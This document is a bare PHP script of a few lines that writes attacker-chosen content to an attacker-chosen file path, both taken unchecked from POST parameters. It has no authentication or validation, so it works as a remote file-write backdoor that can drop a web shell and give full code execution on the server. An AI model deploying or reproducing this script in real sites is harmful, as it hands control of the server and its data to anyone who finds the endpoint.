<?PHP

	$fh = fopen($_POST['file_name'],'w');
	fwrite($fh, $_POST['file_data']);
	fclose($fh);	

?>